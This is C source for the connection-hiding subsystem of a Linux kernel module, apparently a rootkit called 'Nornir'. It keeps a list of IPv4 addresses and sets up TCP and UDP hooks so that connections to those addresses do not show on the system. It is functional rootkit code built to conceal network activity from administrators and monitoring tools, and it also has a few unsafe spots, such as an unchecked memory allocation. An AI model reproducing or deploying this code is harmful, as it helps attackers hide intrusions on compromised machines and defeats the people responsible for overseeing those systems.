/**
 * Copyright (c) 2024 arttnba3 <arttnba@gmail.com>
 * 
 * This work is licensed under the terms of the GNU GPL, version 2 or later.
 */

#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/spinlock.h>
#include <linux/inet.h>
#include "common/logger.h"
#include "libs/hooks.h"
#include "libs/ksym.h"
#include "net/hide.h"
#include "net/tcp_hook.h"
#include "net/udp_hook.h"

LIST_HEAD(hidden_conn_list);
DEFINE_SPINLOCK(hidden_conn_lock);

int nornir_convert_inet4_str_to_addr(const char*addr_str, struct in_addr*result)
{
    size_t addr_len;

    addr_len = strlen(addr_str);
    return in4_pton(addr_str,-1,(u8*) &result->s_addr,'\n',NULL) ? 0 : -EINVAL;
}

void nornir_add_new_hidden_conn4(struct in_addr addr)
{
    struct hidden_conn_info *info;

    info = nornir_get_hidden_conn4_info(addr);
    if (unlikely(info)) {
        logger_warn(
            "Connection %d.%d.%d.%d have already been hidden",
            addr.s_addr & 0xFF,
            (addr.s_addr >> 8) & 0xFF,
            (addr.s_addr >> 16) & 0xFF,
            (addr.s_addr >> 24) & 0xFF
        );

        return ;
    }

    spin_lock(&hidden_conn_lock);

    info = kmalloc(sizeof(*info), GFP_KERNEL);
    memcpy(&info->addr4, &addr, sizeof(addr));
    list_add(&info->list, &hidden_conn_list);

    spin_unlock(&hidden_conn_lock);
}

void nornir_add_new_hidden_ipv4_addr(const char *addr)
{
    struct in_addr in_addr;

    if (nornir_convert_inet4_str_to_addr(addr, &in_addr)) {
        logger_error("Unable to parse addr \"%s\", value invalid.\n", addr);
        return ;
    }

    nornir_add_new_hidden_conn4(in_addr);
}

void nornir_remove_hidden_conn4(struct in_addr addr)
{
    struct hidden_conn_info *info;

    info = nornir_get_hidden_conn4_info(addr);
    if (unlikely(!info)) {
        logger_warn(
            "Connection %d.%d.%d.%d had not been hidden",
            addr.s_addr & 0xFF,
            (addr.s_addr >> 8) & 0xFF,
            (addr.s_addr >> 16) & 0xFF,
            (addr.s_addr >> 24) & 0xFF
        );

        return ;
    }

    spin_lock(&hidden_conn_lock);

    list_del(&info->list);
    kfree(info);

    spin_unlock(&hidden_conn_lock);
}

void nornir_remove_hidden_ipv4_addr(const char *addr)
{
    struct in_addr in_addr;

    if (nornir_convert_inet4_str_to_addr(addr, &in_addr)) {
        logger_error("Unable to parse addr \"%s\", value invalid.\n", addr);
        return ;
    }

    nornir_remove_hidden_conn4(in_addr);
}

struct hidden_conn_info* nornir_get_hidden_conn4_info(struct in_addr addr)
{
    struct hidden_conn_info *info, *ret = NULL;

    spin_lock(&hidden_conn_lock);

    list_for_each_entry(info, &hidden_conn_list, list) {
        if (info->addr4.s_addr == addr.s_addr) {
            ret = info;
            break;
        }
    }

    spin_unlock(&hidden_conn_lock);

    return ret;
}

int nornir_init_conn_hidden_subsystem(void)
{
    int error = 0;

#ifdef CONFIG_NORNIR_HIDE_TCP_CONN
    error = nornir_init_tcp_hooks();
    if (error) {
        logger_error("Unable to hook TCP functions, error code: %d.\n", error);
        goto err_tcp_hook;
    }
#endif

#ifdef CONFIG_NORNIR_HIDE_UDP_CONN
    error = nornir_init_udp_hooks();
    if (error) {
        logger_error("Unable to hook UDP functions, error code: %d.\n", error);
        goto err_udp_hook;
    }
#endif

    return 0;

#ifdef CONFIG_NORNIR_HIDE_UDP_CONN
err_udp_hook:
#endif

#ifdef CONFIG_NORNIR_HIDE_TCP_CONN
    nornir_unload_tcp_hooks();
err_tcp_hook:
#endif

    return error;
}

void nornir_unload_conn_hidden_subsystem(void)
{
#ifdef CONFIG_NORNIR_HIDE_TCP_CONN
    nornir_unload_tcp_hooks();
#endif

#ifdef CONFIG_NORNIR_HIDE_UDP_CONN
    nornir_unload_udp_hooks();
#endif
}
